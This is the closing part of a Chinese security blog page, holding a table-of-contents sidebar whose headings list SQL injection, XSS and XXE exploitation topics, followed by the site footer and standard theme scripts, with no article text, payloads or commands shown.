href="#SQL注入写shell"><span class="level-left"><span class="level-item">6.3</span><span class="level-item">SQL注入写shell</span></span></a><ul class="menu-list"><ul class="menu-list"><li><a class="level is-mobile" href="#利用步骤："><span class="level-left"><span class="level-item">6.3.1.1</span><span class="level-item">利用步骤：</span></span></a></li></ul></ul></li><li><a class="level is-mobile" href="#宽字节注入原理"><span class="level-left"><span class="level-item">6.4</span><span class="level-item">宽字节注入原理</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#二次注入漏洞原理"><span class="level-left"><span class="level-item">6.4.1</span><span class="level-item">二次注入漏洞原理</span></span></a></li></ul></li><li><a class="level is-mobile" href="#union注入"><span class="level-left"><span class="level-item">6.5</span><span class="level-item">union注入</span></span></a></li><li><a class="level is-mobile" href="#MySQL提权"><span class="level-left"><span class="level-item">6.6</span><span class="level-item">MySQL提权</span></span></a><ul class="menu-list"><ul class="menu-list"><li><a class="level is-mobile" href="#UDF-提权（User-Defined-Function，用户自定义函数提权）"><span class="level-left"><span class="level-item">6.6.1.1</span><span class="level-item">UDF 提权（User-Defined Function，用户自定义函数提权）</span></span></a></li><li><a class="level is-mobile" href="#MOF-提权（Managed-Object-Format，托管对象格式提权）"><span class="level-left"><span class="level-item">6.6.1.2</span><span class="level-item">MOF 提权（Managed Object Format，托管对象格式提权）</span></span></a></li></ul></ul></li><li><a class="level is-mobile" href="#MySQL-的-xp-cmdshell-函数被禁用怎么绕过"><span class="level-left"><span class="level-item">6.7</span><span class="level-item">MySQL 的 xp_cmdshell() 函数被禁用怎么绕过</span></span></a></li><li><a class="level is-mobile" href="#MySQL5-0上下版本区别"><span class="level-left"><span class="level-item">6.8</span><span class="level-item">MySQL5.0上下版本区别</span></span></a><ul class="menu-list"><ul class="menu-list"><li><a class="level is-mobile" href="#information-schma的有无"><span class="level-left"><span class="level-item">6.8.1.1</span><span class="level-item">information_schma的有无</span></span></a></li><li><a class="level is-mobile" href="#并发操作模式"><span class="level-left"><span class="level-item">6.8.1.2</span><span class="level-item">并发操作模式</span></span></a></li></ul></ul></li><li><a class="level is-mobile" href="#SQLMap自带的脚本"><span class="level-left"><span class="level-item">6.9</span><span class="level-item">SQLMap自带的脚本</span></span></a></li><li><a class="level is-mobile" href="#扫出-asp数据库，访问乱码怎么利用"><span class="level-left"><span class="level-item">6.10</span><span class="level-item">扫出.asp数据库，访问乱码怎么利用</span></span></a></li><li><a class="level is-mobile" href="#找到注入点怎么判断何种数据库"><span class="level-left"><span class="level-item">6.11</span><span class="level-item">找到注入点怎么判断何种数据库</span></span></a><ul class="menu-list"><ul class="menu-list"><li><a class="level is-mobile" href="#看报错信息"><span class="level-left"><span class="level-item">6.11.1.1</span><span class="level-item">看报错信息</span></span></a></li><li><a class="level is-mobile" href="#函数和语法判断"><span class="level-left"><span class="level-item">6.11.1.2</span><span class="level-item">函数和语法判断</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#MySQL"><span class="level-left"><span class="level-item">6.11.1.2.1</span><span class="level-item">MySQL</span></span></a></li><li><a class="level is-mobile" href="#SQLServer"><span class="level-left"><span class="level-item">6.11.1.2.2</span><span class="level-item">SQLServer</span></span></a></li><li><a class="level is-mobile" href="#Oracle"><span class="level-left"><span class="level-item">6.11.1.2.3</span><span class="level-item">Oracle</span></span></a></li><li><a class="level is-mobile" href="#PostgreSQL-1"><span class="level-left"><span class="level-item">6.11.1.2.4</span><span class="level-item">PostgreSQL</span></span></a></li><li><a class="level is-mobile" href="#不同数据库的查询区别"><span class="level-left"><span class="level-item">6.11.1.2.5</span><span class="level-item">不同数据库的查询区别</span></span></a></li></ul></li></ul></ul></li><li><a class="level is-mobile" href="#MySQL-一个-和两个-的区别"><span class="level-left"><span class="level-item">6.12</span><span class="level-item">MySQL 一个 @ 和两个 @ 的区别</span></span></a></li><li><a class="level is-mobile" href="#为什么MySQL存储过程可以执行命令"><span class="level-left"><span class="level-item">6.13</span><span class="level-item">为什么MySQL存储过程可以执行命令</span></span></a></li><li><a class="level is-mobile" href="#如果想要通过MySQL上传文件需要开启那个存储过程的权限"><span class="level-left"><span class="level-item">6.14</span><span class="level-item">如果想要通过MySQL上传文件需要开启那个存储过程的权限</span></span></a></li></ul></li><li><a class="level is-mobile" href="#XSS"><span class="level-left"><span class="level-item">7</span><span class="level-item">XSS</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#防御"><span class="level-left"><span class="level-item">7.1</span><span class="level-item">防御</span></span></a></li><li><a class="level is-mobile" href="#绕过手法-1"><span class="level-left"><span class="level-item">7.2</span><span class="level-item">绕过手法</span></span></a></li><li><a class="level is-mobile" href="#xss利用"><span class="level-left"><span class="level-item">7.3</span><span class="level-item">xss利用</span></span></a><ul class="menu-list"><ul class="menu-list"><li><a class="level is-mobile" href="#窃取cookie和session"><span class="level-left"><span class="level-item">7.3.1.1</span><span class="level-item">窃取cookie和session</span></span></a></li><li><a class="level is-mobile" href="#键盘记录"><span class="level-left"><span class="level-item">7.3.1.2</span><span class="level-item">键盘记录</span></span></a></li><li><a class="level is-mobile" href="#钓鱼攻击"><span class="level-left"><span class="level-item">7.3.1.3</span><span class="level-item">钓鱼攻击</span></span></a></li><li><a class="level is-mobile" href="#网页挂马和恶意重定向"><span class="level-left"><span class="level-item">7.3.1.4</span><span class="level-item">网页挂马和恶意重定向</span></span></a></li><li><a class="level is-mobile" href="#绕过同源策略"><span class="level-left"><span class="level-item">7.3.1.5</span><span class="level-item">绕过同源策略</span></span></a></li><li><a class="level is-mobile" href="#盗用-CSRF-Token"><span class="level-left"><span class="level-item">7.3.1.6</span><span class="level-item">盗用 CSRF Token</span></span></a></li><li><a class="level is-mobile" href="#DOM篡改"><span class="level-left"><span class="level-item">7.3.1.7</span><span class="level-item">DOM篡改</span></span></a></li></ul></ul></li><li><a class="level is-mobile" href="#xss怎么打内网"><span class="level-left"><span class="level-item">7.4</span><span class="level-item">xss怎么打内网</span></span></a></li><li><a class="level is-mobile" href="#有shell的情况怎么xss实现对目标长久控制"><span class="level-left"><span class="level-item">7.5</span><span class="level-item">有shell的情况怎么xss实现对目标长久控制</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#xss劫持管理员会话"><span class="level-left"><span class="level-item">7.5.1</span><span class="level-item">xss劫持管理员会话</span></span></a></li><li><a class="level is-mobile" href="#xss注入后台管理页面后门"><span class="level-left"><span class="level-item">7.5.2</span><span class="level-item">xss注入后台管理页面后门</span></span></a></li><li><a class="level is-mobile" href="#xss-劫持websocket连接"><span class="level-left"><span class="level-item">7.5.3</span><span class="level-item">xss 劫持websocket连接</span></span></a></li><li><a class="level is-mobile" href="#浏览器屏幕截图"><span class="level-left"><span class="level-item">7.5.4</span><span class="level-item">浏览器屏幕截图</span></span></a></li><li><a class="level is-mobile" href="#利用-XSS-注入持久化-localStorage-后门"><span class="level-left"><span class="level-item">7.5.5</span><span class="level-item">利用 XSS 注入持久化 localStorage 后门</span></span></a></li></ul></li></ul></li><li><a class="level is-mobile" href="#XXE"><span class="level-left"><span class="level-item">8</span><span class="level-item">XXE</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#XXE漏洞利用"><span class="level-left"><span class="level-item">8.1</span><span class="level-item">XXE漏洞利用</span></span></a><ul class="menu-list"><ul class="menu-list"><li><a class="level is-mobile" href="#文件读取"><span class="level-left"><span class="level-item">8.1.1.1</span><span class="level-item">文件读取</span></span></a></li><li><a class="level is-mobile" href="#拒绝服务攻击（Dos）"><span class="level-left"><span class="level-item">8.1.1.2</span><span class="level-item">拒绝服务攻击（Dos）</span></span></a></li><li><a class="level is-mobile" href="#内网端口扫描"><span class="level-left"><span class="level-item">8.1.1.3</span><span class="level-item">内网端口扫描</span></span></a></li><li><a class="level is-mobile" href="#盲-XXE（Blind-XXE）"><span class="level-left"><span class="level-item">8.1.1.4</span><span class="level-item">盲 XXE（Blind XXE）</span></span></a></li></ul></ul></li><li><a class="level is-mobile" href="#XXE盲注"><span class="level-left"><span class="level-item">8.2</span><span class="level-item">XXE盲注</span></span></a><ul class="menu-list"><ul class="menu-list"><li><a class="level is-mobile" href="#带外请求（OOB）"><span class="level-left"><span class="level-item">8.2.1.1</span><span class="level-item">带外请求（OOB）</span></span></a></li><li><a class="level is-mobile" href="#利用带外请求获取文件内容"><span class="level-left"><span class="level-item">8.2.1.2</span><span class="level-item">利用带外请求获取文件内容</span></span></a></li><li><a class="level is-mobile" href="#利用参数实体获取错误信息"><span class="level-left"><span class="level-item">8.2.1.3</span><span class="level-item">利用参数实体获取错误信息</span></span></a></li><li><a class="level is-mobile" href="#利用-DNSlog-获取数据"><span class="level-left"><span class="level-item">8.2.1.4</span><span class="level-item">利用 DNSlog 获取数据</span></span></a></li></ul></ul></li><li><a class="level is-mobile" href="#PCDATA-和-CDATA-的区别"><span class="level-left"><span class="level-item">8.3</span><span class="level-item">PCDATA 和 CDATA 的区别</span></span></a></li></ul></li></ul></div></div><script src="/js/toc.js" defer></script></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/logo.svg" referrerpolicy="no-referrer" alt="Sky&#039;s Blog" height="28"></a><p class="is-size-7"><span>&copy; 2025 Sky</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p><p class="is-size-7">© 2025</p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdnjs.loli.net/ajax/libs/jquery/3.3.1/jquery.min.js"></script><script src="https://cdnjs.loli.net/ajax/libs/moment.js/2.22.2/moment-with-locales.min.js"></script><script src="https://cdnjs.loli.net/ajax/libs/clipboard.js/2.0.4/clipboard.min.js" defer></script><script>moment.locale("zh-cn");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script data-pjax src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script data-pjax src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdnjs.loli.net/ajax/libs/cookieconsent/3.1.1/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "此网站使用Cookie来改善您的体验。",
          dismiss: "知道了！",
          allow: "允许使用Cookie",
          deny: "拒绝",
          link: "了解更多",
          policy: "Cookie政策",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><script src="https://cdnjs.loli.net/ajax/libs/lightgallery/1.10.0/js/lightgallery.min.js" defer></script><script src="https://cdnjs.loli.net/ajax/libs/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><!--!--><!--!--><!--!--><script data-pjax src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script data-pjax src="/js/insight.js" defer></script><script data-pjax>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
        });</script></body></html>